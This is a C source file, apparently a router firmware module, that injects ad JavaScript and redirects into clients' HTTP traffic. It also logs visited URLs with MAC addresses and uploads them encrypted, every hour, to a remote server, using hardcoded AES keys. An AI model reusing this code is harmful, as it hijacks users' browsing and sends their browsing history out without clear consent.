#include "igd_lib.h"
#include "igd_advert.h"
#include "igd_cloud.h"
#include "igd_interface.h"

static int enable;
static unsigned int gid;
static unsigned char upload_advert_flag = 0;
static struct list_head advert_h;
static struct schedule_entry *ad_event;
static struct advert_rule sysr;
static struct in_addr server;
static char sdomain[IGD_DNS_LEN];
static unsigned int devid;

#define ADVERT_LOG_PATH  "/tmp/advert_log"
//#ifdef FLASH_4_RAM_32
#if 1
#define ADVERT_DEBUG(fmt,args...) do{}while(0)
#else
#define ADVERT_DEBUG(fmt,args...) do{igd_log(ADVERT_LOG_PATH, fmt, ##args);}while(0)
#endif

static void advert_time_cb(void *data);

/*check src is have end, and offset*/
#define ADVERT_DATA_PARSER(data, src, end, min, max, lable) do{\
	data = strchr(src, end);\
	if (!data) {\
		ADVERT_DEBUG("%s:%d\n", __FUNCTION__, __LINE__);\
		goto lable;\
	}\
	if (((data - src) < min) || ((data - src) > max)) {\
		ADVERT_DEBUG("%s:%d\n", __FUNCTION__, __LINE__);\
		goto lable;\
	}\
}while(0)

/*check int*/
#define ADVERT_DATA_CHECK_INT(data, min, max, lable) do{\
	if (data < min || data > max) {\
		ADVERT_DEBUG("%s:%d\n", __FUNCTION__, __LINE__);\
		goto lable;\
	}\
}while(0)

static int advert_param_save(void)
{
	char cmd[128];
	snprintf(cmd, sizeof(cmd), "%s.blacklist.enable=%d", ADVERT_CONFIG, enable);
	uuci_set(cmd);
	return 0;
}

static void advert_upload_enable(void *data)
{
	int i, uid = 1;
	char buf[128];
	struct timeval tv;
	struct iface_info info;

	if (upload_advert_flag)
		return;

	tv.tv_sec = 10;
	tv.tv_usec = 0;

	if (!schedule(tv, advert_upload_enable, NULL)) {
		ADVERT_DEBUG("upload advert enable timer err\n");
		return;
	}
	mu_call(IF_MOD_IFACE_INFO, &uid, sizeof(uid), &info, sizeof(info));
	if (info.net == NET_OFFLINE)
		return;
	CC_PUSH2(buf, 2, CSO_NTF_ROUTER_PRICE);
	i = 8;
	CC_PUSH1(buf, i, enable);
	i += 1;
	CC_PUSH2(buf, 0, i);
	CC_CALL_ADD(buf, i);
}

static int advert_add(struct advert_rule *advert)
{
	int ret = 0;
	
	if (advert->rid > 0)
		return 0;
	switch (advert->type) {
	case ADVERT_TYPE_JS:
		igd_set_bit(URL_RULE_LOG_BIT, &advert->args.flags);
		igd_set_bit(URL_RULE_JS_BIT, &advert->args.flags);
		advert->args.mid = URL_MID_ADVERT;
		advert->args.type = ADVERT_TYPE_JS;
		advert->args.prio = 1;
		ret = register_http_rule(&advert->host, &advert->args);
		if (ret <= 0) {
			ADVERT_DEBUG("add js rule error %d, rd [%s]\n", advert->rid, advert->args.rd.url);
			break;
		}
		advert->rid = ret;
		break;
	case ADVERT_TYPE_SEARCH:
		igd_set_bit(URL_RULE_LOG_BIT, &advert->args.flags);
		igd_set_bit(URL_RULE_JS_BIT, &advert->args.flags);
		advert->args.prio = 1;
		advert->args.mid = URL_MID_ADVERT;
		advert->args.type = ADVERT_TYPE_SEARCH;
		ret = register_http_rule(&advert->host, &advert->args);
		if (ret <= 0) {
			ADVERT_DEBUG("add search rule error %d, rd [%s]\n", advert->rid, advert->args.rd.url);
			break;
		}
		advert->rid = ret;
		break;
	case ADVERT_TYPE_302:
		igd_set_bit(URL_RULE_LOG_BIT, &advert->args.flags);
		advert->args.mid = URL_MID_REDIRECT;
		advert->args.type = ADVERT_TYPE_302;
		ret = register_http_rule(&advert->host, &advert->args);
		if (ret <= 0) {
			ADVERT_DEBUG("add 302 rule error %d, rd [%s]\n", advert->rid, advert->args.rd.url);
			break;
		}
		advert->rid = ret;
		break;
	case ADVERT_TYPE_404:
		advert->args.type = ADVERT_TYPE_404;
		ret = register_http_rsp(HTTP_RSP_404, &advert->args.rd);
		if (ret != 0)
			ADVERT_DEBUG("add 404 rule error %d, rd [%s]\n", advert->rid, advert->args.rd.url);
		else
			advert->rid = 1;
		break;
	case ADVERT_TYPE_RST:
		advert->args.type = ADVERT_TYPE_RST;
		ret = register_http_rsp(HTTP_RSP_RST, &advert->args.rd);
		if (ret != 0)
			ADVERT_DEBUG("add RST rule error %d, rd [%s]\n", advert->rid, advert->args.rd.url);
		else
			advert->rid = 1;
		break;
	case ADVERT_TYPE_TN:
		igd_set_bit(URL_RULE_LOG_BIT, &advert->args.flags);
		advert->args.mid = URL_MID_URI_SUB;
		advert->args.type = ADVERT_TYPE_TN;
		ret = register_http_rule(&advert->host, &advert->args);
		if (ret <= 0) {
			ADVERT_DEBUG("add tn rule error %d, rd [%s]\n", advert->rid, advert->args.rd.url);
			break;
		}
		advert->rid = ret;
		break;
	case ADVERT_TYPE_GWD:
		igd_set_bit(URL_RULE_LOG_BIT, &advert->args.flags);
		igd_set_bit(URL_RULE_GWD_BIT, &advert->args.flags);
		advert->args.mid = URL_MID_REDIRECT;
		advert->args.type = ADVERT_TYPE_GWD;
		ret = register_http_rule(&advert->host, &advert->args);
		if (ret <= 0) {
			ADVERT_DEBUG("add gwd rule error %d, rd [%s]\n", advert->rid, advert->args.rd.url);
			break;
		}
		advert->rid = ret;
		break;
	case ADVERT_TYPE_INVERT:
		igd_set_bit(URL_RULE_LOG_BIT, &advert->args.flags);
		igd_set_bit(URL_RULE_HOST_INVERT_BIT, &advert->args.flags);
		advert->args.prio = 1;
		advert->args.mid = URL_MID_JSRET;
		advert->args.type = ADVERT_TYPE_INVERT;
		ret = register_http_rule(&advert->host, &advert->args);
		if (ret <= 0) {
			ADVERT_DEBUG("add invert rule error %d, rd [%s]\n", advert->rid, advert->args.rd.url);
			break;
		}
		advert->rid = ret;
		break;
	case ADVERT_TYPE_NEWJS:
		igd_set_bit(URL_RULE_LOG_BIT, &advert->args.flags);
		advert->args.mid = URL_MID_JSRET;
		advert->args.type = ADVERT_TYPE_NEWJS;
		ret = register_http_rule(&advert->host, &advert->args);
		if (ret <= 0) {
			ADVERT_DEBUG("add jsret rule error %d, rd [%s]\n", advert->rid, advert->args.rd.url);
			break;
		}
		advert->rid = ret;
		break;
	case ADVERT_TYPE_BDJS:
		igd_set_bit(URL_RULE_LOG_BIT, &advert->args.flags);
		igd_set_bit(URL_RULE_HOST_INVERT_BIT, &advert->args.flags);
		advert->args.prio = 1;
		advert->args.mid = URL_MID_JSRET;
		advert->args.type = ADVERT_TYPE_BDJS;
		ret = register_http_rule(&advert->host, &advert->args);
		if (ret <= 0) {
			ADVERT_DEBUG("add baidu invert rule error %d, rd [%s]\n", advert->rid, advert->args.rd.url);
			break;
		}
		advert->rid = ret;
		break;
	default:
		break;
	}
	return 0;
}

static int advert_del(struct advert_rule *advert)
{
	int ret;

	if (!advert->rid)
		return 0;
	switch (advert->type) {
	case ADVERT_TYPE_JS:
	case ADVERT_TYPE_302:
	case ADVERT_TYPE_TN:
	case ADVERT_TYPE_GWD:
	case ADVERT_TYPE_SEARCH:
	case ADVERT_TYPE_INVERT:
	case ADVERT_TYPE_NEWJS:
	case ADVERT_TYPE_BDJS:
		ret = unregister_http_rule(advert->args.mid, advert->rid);
		break;
	case ADVERT_TYPE_RST:
		ret = unregister_http_rsp(HTTP_RSP_RST);
		break;
	case ADVERT_TYPE_404:
		ret = unregister_http_rsp(HTTP_RSP_404);
		break;
	default:
		ret = -1;
		break;
	}
	if (ret == 0)
		advert->rid = 0;
	return ret;
}

static int advert_js_close(void)
{
	if (!enable)
		return 0;
	if (ad_event) {
		dschedule(ad_event);
		ad_event = NULL;
	}
	enable = 0;
	advert_time_cb(NULL);
	return 0;
}

static int advert_js_open(void)
{
	if (enable)
		return 0;
	if (ad_event) {
		dschedule(ad_event);
		ad_event = NULL;
	}
	enable = 1;
	advert_time_cb(NULL);
	return 0;
}

static int advert_free(void)
{
	struct advert_rule *advert, *tmp;

	list_for_each_entry_safe(advert, tmp, &advert_h, list) {
		advert_del(advert);
		if (advert->hgid > 0)
			del_group(USER_GRP, advert->hgid);
		if (advert->ugid > 0)
			del_group(URL_GRP, advert->ugid);
		free(advert);
	}
	if (ad_event) {
		dschedule(ad_event);
		ad_event = NULL;
	}
	INIT_LIST_HEAD(&advert_h);
	return 0;
}

static int advert_parser_week(struct advert_rule *advert, char *data)
{
	int i;
	struct tm *tm = get_tm();
	struct time_comm *atm = &advert->tm;

	for (i = 0; i < 7; i++) {
		if (*(data + i) == '1')
		atm->day_flags |= (1 << i);
	}
	if (atm->day_flags)
		atm->loop = 1;
	else
		atm->day_flags |= (1 << tm->tm_wday);
	return 0;
}

static int advert_parser_time(struct advert_rule *advert, char *data)
{
	char *tmp;
	struct time_comm *atm = &advert->tm;

	ADVERT_DATA_PARSER(tmp, data, ':', 2, 2,ERROR);
	atm->start_hour = atoi(data);
	ADVERT_DATA_CHECK_INT(atm->start_hour, 0, 23, ERROR);
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, '-', 2, 2,ERROR);	
	atm->start_min = atoi(data);
	ADVERT_DATA_CHECK_INT(atm->start_min, 0, 59, ERROR);
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, ':', 2, 2,ERROR);	
	atm->end_hour = atoi(data);
	ADVERT_DATA_CHECK_INT(atm->end_hour, 0, 23, ERROR);
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, ';', 2, 2,ERROR);
	atm->end_min = atoi(data);
	ADVERT_DATA_CHECK_INT(atm->end_hour, 0, 59, ERROR);
	return 0;
ERROR:
	return -1;
}

static int advert_parser_host(struct advert_rule *advert, char *data)
{
	int nr;
	int len;
	int ugid;
	char retstr[32];
	char *tmp, *q;
	struct in_addr addr;
	struct inet_host *host;
	unsigned char macgrp[IGD_USER_GRP_PER_MX][ETH_ALEN];

	tmp = data;
	host = &advert->host;
	host->type = atoi(data);

	switch(host->type) {
	case INET_HOST_NONE:
	case INET_HOST_PC:
	case INET_HOST_WINDOWS:
	case INET_HOST_LINUX:
	case INET_HOST_MACOS:
	case INET_HOST_MOBILE:
	case INET_HOST_PHONE:
	case INET_HOST_AND_PHONE:
	case INET_HOST_WIN_PHONE:
	case INET_HOST_APP_PHONE:
	case INET_HOST_IPAD:
		break;
	case INET_HOST_STD:
		ADVERT_DATA_PARSER(q, tmp, '[', 1, 1, ERROR);
		tmp = q + 1;
		ADVERT_DATA_PARSER(q, tmp, '-', 7, 15, ERROR);
		__arr_strcpy_end((unsigned char *)retstr,
							(unsigned char *)tmp,
							sizeof(retstr) -1, '-');
		inet_aton(retstr, &addr);
		host->addr.start = addr.s_addr;
		tmp = q + 1;
		ADVERT_DATA_PARSER(q, tmp, ']', 7, 15, ERROR);
		__arr_strcpy_end((unsigned char *)retstr,
							(unsigned char *)tmp,
							sizeof(retstr) -1, ']');
		inet_aton(retstr, &addr);
		host->addr.end = addr.s_addr;
		tmp = q;
		ADVERT_DATA_PARSER(q, tmp, ';', 1, 1, ERROR);
		break;
	case INET_HOST_UGRP:
		tmp = strchr(data, '[');
		q = strchr(data, ']');
		if (!tmp || !q || ((tmp + 1) == q))
			return -1;
		while(tmp) {
			ugid = atoi(tmp + 1);
			ADVERT_DATA_CHECK_INT(ugid, 0, GROUP_MX, ERROR);
			igd_set_bit(ugid, host->ugrp);
			data = tmp + 1;
			tmp = strchr(data, '|');
			if (tmp > q)
				break;
		}
		tmp = q;
		ADVERT_DATA_PARSER(q, tmp, ';', 1, 1, ERROR);
		break;
	case INET_HOST_MAC:
		q = strchr(data, ']');
		tmp = strchr(data, '[');
		if (!tmp || !q)
			return -1;
		len = q - tmp;
		if (len < 18)
			return -1;
		nr = 0;
		tmp += 1;
		len -= 1;
		memset(host, 0x0, sizeof(struct inet_host));
		while(nr < IGD_USER_GRP_PER_MX) {
			memset(retstr, 0x0, sizeof(retstr));
			strncpy(retstr, tmp, 17);
			parse_mac(retstr, macgrp[nr]);
			if (macgrp[nr][0])
				nr++;
			tmp += 17;
			len -= 17;
			if (len < 18)
				break;
			if (*tmp == ']') {
				break;
			} else if (*tmp == '|') {
				tmp += 1;
				len -= 1;
			} else
				break;
		}
		tmp = q;
		ADVERT_DATA_PARSER(q, tmp, ';', 1, 1, ERROR);
		if (nr > 1) {
			snprintf(retstr, sizeof(retstr), "advertgrp%d", gid);
			ugid = add_user_grp_by_mac(retstr, nr, macgrp);
			if (ugid <= 0)
				return -1;
			igd_set_bit(ugid, host->ugrp);
			host->type = INET_HOST_UGRP;
			advert->hgid = ugid;
		} else if (nr == 1) {
			memcpy(host->mac, macgrp[0], ETH_ALEN);
		} else {
			return -1;
		}
		gid++;
		break;
	default:
		return -1;
	}
	return 0;
ERROR:
	return -1;
}

int advert_parser_url(struct advert_rule *advert, char *data)
{
	int nr = 0;
	char *p = NULL;
	char name[IGD_NAME_LEN];
	char url[IGD_URL_GRP_PER_MX][IGD_URL_LEN];

	if (*data == ';')
		goto finish;
	while(1) {
		if ((p = strchr(data, '|')) == NULL) {
			ADVERT_DATA_PARSER(p, data, ';', 3, IGD_URL_LEN - 1, ERROR);
			if (!strncmp(data, "https://", 8)) {
				data += 8;
				igd_set_bit(RD_KEY_HTTPS, &advert->args.rd.flags);
			} else if (!strncmp(data, "http://", 7)) {
				data += 7;
			}
			__arr_strcpy_end((unsigned char *)url[nr],
							(unsigned char *)data,
							IGD_URL_LEN -1, ';');
			nr++;
			data = p + 1;
			break;
		}
		if (advert->type == ADVERT_TYPE_TN)
			goto ERROR;
		ADVERT_DATA_PARSER(p, data, '|', 3, IGD_URL_LEN - 1, ERROR);
		if (!strncmp(data, "https://", 8)) {
			data += 8;
			igd_set_bit(RD_KEY_HTTPS, &advert->args.rd.flags);
		} else if (!strncmp(data, "http://", 7)) {
				data += 7;
		}
		__arr_strcpy_end((unsigned char *)url[nr],
						(unsigned char *)data,
						IGD_URL_LEN -1, '|');
		nr++;
		data = p + 1;
	}
finish:
	if (nr > 1) {
		if (advert->type > ADVERT_TYPE_MX)
			snprintf(name, sizeof(name), "wiairsys_%d", advert->type);
		else
			snprintf(name, sizeof(name), "advert%d", gid);
		advert->args.l3.type = INET_L3_URLID;
		advert->args.l3.gid = add_url_grp(name, nr, url);
		advert->ugid = advert->args.l3.gid;
		if (advert->ugid <= 0)
			goto ERROR;
		gid++;
	} else if (nr == 1) {
		advert->args.l3.type = INET_L3_URL;
		arr_strcpy(advert->args.l3.dns, url[0]);
	} else if (nr == 0) {
		advert->args.l3.type = INET_L3_NONE;
	} else {
		goto ERROR;
	}
	return 0;
ERROR:
	return -1;
}

static int advert_time_cmp(struct tm *t, struct time_comm *m)
{
	int i = 0;
	int now, start, end, week, pre;

	now = t->tm_hour*60 + t->tm_min;
	start = m->start_hour*60 + m->start_min;
	end = m->end_hour*60 + m->end_min;
	week = t->tm_wday;
	pre = (week > 0) ? (week - 1) : 6;

	if ((pre < 0) || (pre > 6))
		return 0;
	if ((week < 0) || (week > 6))
		return 0;

	if (!m->loop) {
		for (i = 0; i < 7; i++) {
			if (m->day_flags & (1<<i))
				break;
		}
		if (start < end) {
			if ((i == week) && now >= end)
				return -1;
		} else if (start > end) {
			if ((week == (i + 1)) && now >= end)
				return -1;
		}
	}
	
	if (start < end) {
		if ((m->day_flags & (1 << week)) &&
			 (now >= start) && (now < end)) {
			return 1;
		}
	} else if (start > end) {
		if (((m->day_flags & (1 << pre)) && (now < end)) ||
			 ((m->day_flags & (1 << week)) && (now >= start))) {
			return 1;
		}
	}
	return 0;
}

static void advert_time_cb(void *data)
{
	int ret = 0;
	struct timeval tv;
	struct tm *t = get_tm();
	struct advert_rule *advert;

	if (!t)
		goto next;
	list_for_each_entry(advert, &advert_h, list) {
		if (((advert->type == ADVERT_TYPE_JS)
			|| (advert->type == ADVERT_TYPE_NEWJS))
			&& !enable) {
			advert_del(advert);
			continue;
		}
		if (!advert->time_on) {
			advert_add(advert);
			continue;
		}
		ret = advert_time_cmp(t, &advert->tm);
		if (ret > 0)
			advert_add(advert);
		else
			advert_del(advert);
	}
next:
	tv.tv_sec = 60;
	tv.tv_usec = 0;
	ad_event = schedule(tv, advert_time_cb, data);
}

static int advert_update(void)
{
	int len;
	char *p;
	char *buff;
	char *line;
	char *tmp, *data;
	struct stat st;
	struct advert_rule *advert;
	unsigned char pwd[16] = {0xcc, 0xfc, 0x78, 0x66, 0x35, 0x32, 0x97, 0xfc, 0x78, 0x99};

	if (stat(ADVERT_FILE, &st))
		goto out;
	if (!st.st_size) {
		advert_free();
		ADVERT_DEBUG("recv empty rule file, clean all rule\n");
		goto out;
	}
	buff = malloc(st.st_size);
	if (!buff)
		goto out;
	memset(buff, 0x0, st.st_size);
	if (igd_aes_dencrypt(ADVERT_FILE, (unsigned char *)buff, st.st_size, pwd) <= 0) {
		ADVERT_DEBUG("igd_aes_dencrypt file error\n");
		goto out;
	}
	ADVERT_DEBUG("advert file is [%s]\n", buff);
	advert_free();
	while ((p = strchr(buff, '\n')) != NULL) {
		advert = malloc(sizeof(struct advert_rule));
		if (!advert)
			goto NEXT;
		memset(advert, 0x0, sizeof(struct advert_rule));
		len = p - buff + 1;
		line = malloc(len);
		if (!line)
			goto ADVERT;
		memset(line, 0x0, len);
		__arr_strcpy_end((unsigned char *)line,
						(unsigned char *)buff,
						len - 1, '\n');
		/*parser open*/
		data = line;
		ADVERT_DATA_PARSER(tmp, data, ';', 1, 1, LINE);
		if (*data != '0' && *data != '1')
			goto LINE;
		if (*data == '0')
			goto LINE;
		/*parser type*/
		data = tmp + 1;
		ADVERT_DATA_PARSER(tmp, data, ';', 1, 2, LINE);
		advert->type = atoi(data);
		ADVERT_DATA_CHECK_INT(advert->type, ADVERT_TYPE_JS, ADVERT_TYPE_MX - 1, LINE);
		/*parser host*/
		data = tmp + 1;
		ADVERT_DATA_PARSER(tmp, data, ';', 1, (IGD_USER_GRP_PER_MX + 1) * ETH_ALEN, LINE);
		if (advert_parser_host(advert, data))
			goto LINE;
		/*parser times*/
		data = tmp + 1;
		ADVERT_DATA_PARSER(tmp, data, ';', 1, 5, LINE);
		advert->args.times = atoi(data);
		ADVERT_DATA_CHECK_INT(advert->args.times, 0, 32767, LINE);
		/*parser probability*/
		data = tmp + 1;
		ADVERT_DATA_PARSER(tmp, data, ';', 1, 3, LINE);
		/*parser period*/
		data = tmp + 1;
		ADVERT_DATA_PARSER(tmp, data, ';', 1, 4, LINE);
		advert->args.period = atoi(data);
		ADVERT_DATA_CHECK_INT(advert->args.period, 0, 60 * 24, LINE);
		/*parser time on*/
		data = tmp + 1;
		ADVERT_DATA_PARSER(tmp, data, ';', 1, 1, LINE);
		advert->time_on = atoi(data);
		ADVERT_DATA_CHECK_INT(advert->time_on, 0, 1, LINE);
		/*parser time*/
		data = tmp + 1;
		ADVERT_DATA_PARSER(tmp, data, ';', 11, 11, LINE);
		if (advert_parser_time(advert, data))
			goto LINE;
		/*parser week*/
		data = tmp + 1;
		ADVERT_DATA_PARSER(tmp, data, ';', 7, 7, LINE);
		if (advert_parser_week(advert, data))
			goto LINE;
		/*parser url*/
		data = tmp + 1;
		if (*data == ';')
			tmp = data;
		else
			ADVERT_DATA_PARSER(tmp, data, ';', 4, IGD_URL_GRP_PER_MX * IGD_URL_LEN, LINE);
		if (advert_parser_url(advert, data))
			goto LINE;
		/*parser dst url*/
		data = tmp + 1;
		ADVERT_DATA_PARSER(tmp, data, '\0', 10, sizeof(advert->args.rd.url) - 1, LINE);
		if (advert->type == ADVERT_TYPE_TN)
			arr_strcpy(advert->args.rd.args, data);
		else
			arr_strcpy(advert->args.rd.url, data);
		list_add_tail(&advert->list, &advert_h);
		buff = p + 1;
		free(line);
		continue;
	LINE:
		ADVERT_DEBUG("error rule [%s]\n", line);
		free(line);
	ADVERT:
		free(advert);
	NEXT:
		buff = p + 1;
	}

	list_for_each_entry(advert, &advert_h, list) {
		ADVERT_DEBUG("[type %d host %d "
					"times %d "
					"period %d " 
					"timeon %d "
					"time %d:%d-%d:%d "
					"loop %d week %d "
					"dst url %s "
					"dst args %s]\n",
					advert->type,
					advert->host.type,
					advert->args.times,
					advert->args.period,
					advert->time_on,
					advert->tm.start_hour,
					advert->tm.start_min,
					advert->tm.end_hour,
					advert->tm.end_min,
					advert->tm.loop,
					advert->tm.day_flags,
					advert->args.rd.url,
					advert->args.rd.args);
	}
	advert_time_cb(NULL);
out:
	remove(ADVERT_FILE);
	return 0;
}

/*just for test*/
static int advert_system(char *file)
{
	int ret = 0;
	struct stat st;
	char *out = NULL;
	char *tmp, *data;
	unsigned char pwd[16] = {0xc5, 0xfc, 0x78, 0x66, 0x3c,
							0x32, 0x94, 0xf3, 0x7d, 0x9e};
	if (sysr.rid > 0)
		unregister_http_rule(sysr.args.mid, sysr.rid);
	if (sysr.hgid > 0)
		del_group(USER_GRP, sysr.hgid);
	if (sysr.ugid > 0)
		del_group(URL_GRP, sysr.ugid);
	memset(&sysr, 0x0, sizeof(sysr));
	if (!file)
		return -1;
	if (stat(file, &st) || !st.st_size)
		goto error;
	out = malloc(st.st_size);
	if (!out)
		goto error;
	memset(out, 0x0, st.st_size);
	if (igd_aes_dencrypt(file, (unsigned char *)out, st.st_size, pwd) <= 0)
		goto out;
	data = out;
	ADVERT_DATA_PARSER(tmp, data, ';', 1, 1, out);
	if (*data != '0' && *data != '1')
		goto out;
	if (*data == '0')
		goto out;
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, ';', 5, 5, out);
	sysr.args.type = atoi(data);
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, ';', 1, (IGD_USER_GRP_PER_MX + 1) * ETH_ALEN, out);
	if (advert_parser_host(&sysr, data))
		goto out;
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, ';', 1, 5, out);
	sysr.args.times = atoi(data);
	ADVERT_DATA_CHECK_INT(sysr.args.times, 0, 32767, out);
	/*parser probability*/
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, ';', 1, 3, out);
	/*parser period*/
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, ';', 1, 4, out);
	sysr.args.period = atoi(data);
	ADVERT_DATA_CHECK_INT(sysr.args.period, 0, 60 * 24, out);
	/*parser time on*/
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, ';', 1, 1, out);
	sysr.time_on = atoi(data);
	ADVERT_DATA_CHECK_INT(sysr.time_on, 0, 1, out);
	/*parser time*/
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, ';', 11, 11, out);
	if (advert_parser_time(&sysr, data))
		goto out;
	/*parser week*/
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, ';', 7, 7, out);
	if (advert_parser_week(&sysr, data))
		goto out;
	/*parser url*/
	data = tmp + 1;
	if (*data == ';')
		tmp = data;
	else
		ADVERT_DATA_PARSER(tmp, data, ';', 4, IGD_URL_GRP_PER_MX * IGD_URL_LEN, out);
	if (advert_parser_url(&sysr, data))
		goto out;
	/*parser dst url*/
	data = tmp + 1;
	ADVERT_DATA_PARSER(tmp, data, '\0', 10, sizeof(sysr.args.rd.url) - 1, out);
	if (sysr.type == ADVERT_TYPE_TN)
		arr_strcpy(sysr.args.rd.args, data);
	else
		arr_strcpy(sysr.args.rd.url, data);
	igd_set_bit(URL_RULE_JS_BIT, &sysr.args.flags);
	igd_set_bit(URL_RULE_HOST_INVERT_BIT, &sysr.args.flags);
	sysr.args.mid = URL_MID_ADVERT;
	ret = register_http_rule(&sysr.host, &sysr.args);
	if (ret <= 0) {
		if (sysr.hgid > 0)
			del_group(USER_GRP, sysr.hgid);
		if (sysr.ugid > 0)
			del_group(URL_GRP, sysr.ugid);
		memset(&sysr, 0x0, sizeof(sysr));
		goto out;
	}
	sysr.rid = ret;
out:
	free(out);
error:
	remove(file);
	return 0;
}

static int advert_send_log(void)
{
	int sock;
	int ov = 65535;
	char *data;
	struct stat st;
	struct sockaddr_in remote;
	unsigned int len, cnt, nlen;
	unsigned char pwd[16] = {0xcd, 0xfc, 0x78, 0x6b, 0x35, 0x3e, 0x97, 0xfc, 0x78, 0x99};

	if (stat(ADVERT_LOG_ZIP, &st)) {
		ADVERT_DEBUG("stat error\n");
		goto out;
	}
	cnt = st.st_size + 256;
	data = malloc(cnt);
	if (NULL == data) {
		ADVERT_DEBUG("no mem\n");
		goto out;
	}
	memset(data, 0x0, cnt);
	nlen = st.st_size + (16 - (unsigned int)st.st_size % 16);
	len = sprintf(data, "POST /Relog HTTP/1.1\r\n");
	len += sprintf(data + len, "User-Agent: wiair\r\n");
	len += sprintf(data + len, "Accept: */*\r\n");
	len += sprintf(data + len, "Host: %s\r\n", sdomain);
	len += sprintf(data + len, "Connection: Keep-Alive\r\n");
	len += sprintf(data + len, "Content-Type: application/x-www-form-urlencoded\r\n");
	len += sprintf(data + len, "Content-Length: %u\r\n\r\n", nlen);
	cnt = igd_aes_encrypt(ADVERT_LOG_ZIP, (unsigned char *)data + len, cnt - len, pwd);
	if (cnt <= 0) {
		ADVERT_DEBUG("enc error\n");
		goto free;
	}
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		ADVERT_DEBUG("socket error\n");
		goto free;
	}
	memset(&remote, 0x0, sizeof(remote));
	remote.sin_family = AF_INET;
	remote.sin_port = htons(80);
	remote.sin_addr.s_addr = server.s_addr;
	if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (void *)&ov, sizeof(ov))) {
		ADVERT_DEBUG("set send buf error\n");
		goto sock_fd;
	}
	if (connect(sock, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
		ADVERT_DEBUG("connect advert sock error\n");
		goto sock_fd;
	}
	if (write(sock, data, len + cnt) < 0)
		ADVERT_DEBUG("send advert log file error\n");
sock_fd:
	close(sock);
free:
	free(data);
out:
	remove(ADVERT_LOG_ZIP);
	return 0;
}

static int advert_dump_log(void)
{
	int nr = 0;
	pid_t pid = 0;
	FILE *fp = NULL;
	struct nlk_url nlk;
	struct url_log_node *tmp;
	struct url_log_node log[URL_RULE_LOG_MX];

	memset(&nlk, 0x0, sizeof(nlk));
	nlk.comm.action = NLK_ACTION_DUMP;
	nlk.comm.obj_nr = 40;
	nlk.comm.obj_len = sizeof(struct url_log_node);
	nr = nlk_dump_from_kernel(NLK_MSG_URL, &nlk, sizeof(nlk), log, URL_RULE_LOG_MX);
	if (nr <= 0)
		return -1;
	if (!server.s_addr || !devid)
		return -1;
	fp = fopen(ADVERT_LOG_FILE, "w");
	if (NULL == fp) {
		ADVERT_DEBUG("open advert log file error\n");
		return -1;
	}
	
	loop_for_each(0, nr) {
		tmp = &log[i];
		fprintf(fp, "%u,%02x%02x%02x%02x%02x%02x,%u,[%s],[%s]\n",
								devid, MAC_SPLIT(tmp->mac),
								(unsigned int)tmp->time,
								tmp->url, tmp->dst);
	} loop_for_each_end();
	
	fclose(fp);
	pid = fork();
	if (pid < 0)
		return -1;
	else if (pid == 0) {
		exec_cmd("gzip %s", ADVERT_LOG_FILE);
		advert_send_log();
		exit(0);
	}
	return 0;
}

static int advert_set_server(void)
{
	if (CC_CALL_RCONF_INFO(RCONF_FLAG_URLHOST, sdomain, sizeof(sdomain))) {
		ADVERT_DEBUG("can not get advert log server\n");
		return -1;
	}
	ADVERT_DEBUG("domain is %s\n", sdomain);
	return 0;
}

static int advert_set_dns_info(struct igd_dns *info)
{
	if (info->nr <= 0)
		return -1;
	server.s_addr = info->addr[0].s_addr;
	return 0;
}

static void advert_log_dns_cb(void *data)
{
	struct timeval tv;
	
	tv.tv_sec = 120;
	tv.tv_usec = 0;
	if (!schedule(tv, advert_log_dns_cb, NULL)) {
		ADVERT_DEBUG("schedule advert dns log dns event error\n");
		return;
	}
	if (!devid)
		devid = get_devid();
	exec_cmd("igd_dns %s %s %u &", sdomain, IPC_PATH_MU, ADVERT_MOD_SET_DNS);
}

static void advert_log_dump_cb(void *data)
{
	struct timeval tv;

	tv.tv_sec = 60 * 60;
	tv.tv_usec = 0;
	if (!schedule(tv, advert_log_dump_cb, NULL)) {
		ADVERT_DEBUG("schedule advert log dump event error\n");
		return;
	}
	advert_dump_log();
	return;
}

static int advdert_init(void)
{
	char *enable_s;
	
	enable_s = uci_getval(ADVERT_CONFIG, "blacklist", "enable");
	if (enable_s) {
		enable = atoi(enable_s);
		free(enable_s);
	} else
		enable = 1;
	upload_advert_flag = 0;
	advert_upload_enable(NULL);
	INIT_LIST_HEAD(&advert_h);
	advert_update();
	advert_set_server();
	advert_log_dns_cb(NULL);
	advert_log_dump_cb(NULL);
	return 0;
}

int advert_call(MSG_ID msgid, void *data, int len, void *rbuf, int rlen)
{
	int ret = -1;
	
	switch (msgid) {
	case ADVERT_MOD_INIT:
		ret = advdert_init();
		break;
	case ADVERT_MOD_UPDATE:
		ret = advert_update();
		break;
	case ADVERT_MOD_ACTION:
		if (!data || len != sizeof(int))
			return -1;
		if (*(int *)data)
			ret = advert_js_open();
		else
			ret = advert_js_close();
		if (!ret) {
			advert_param_save();
			upload_advert_flag = 0;
			advert_upload_enable(NULL);
		}
		break;
	case ADVERT_MOD_DUMP:
		if (!rbuf || rlen != sizeof(int))
			return -1;
		*(int *)rbuf = enable;
		return 0;
	case ADVERT_MOD_UPLOAD_SUCCESS:
		upload_advert_flag = 1;
		ret = 0;
		break;
	case ADVERT_MOD_SET_DNS:
		if (!data || len != sizeof(struct igd_dns))
			return -1;
		ret = advert_set_dns_info((struct igd_dns *)data);
		break;
	case ADVERT_MOD_SET_SERVER:
		ret = advert_set_server();
		break;
	case ADVERT_MOD_LOG_DUMP:
		ret = advert_dump_log();
		break;
	case ADVERT_MOD_SYSTEM:
		ret = advert_system((char *)data);
		break;
	default:
		break;
	}
	return ret;
}
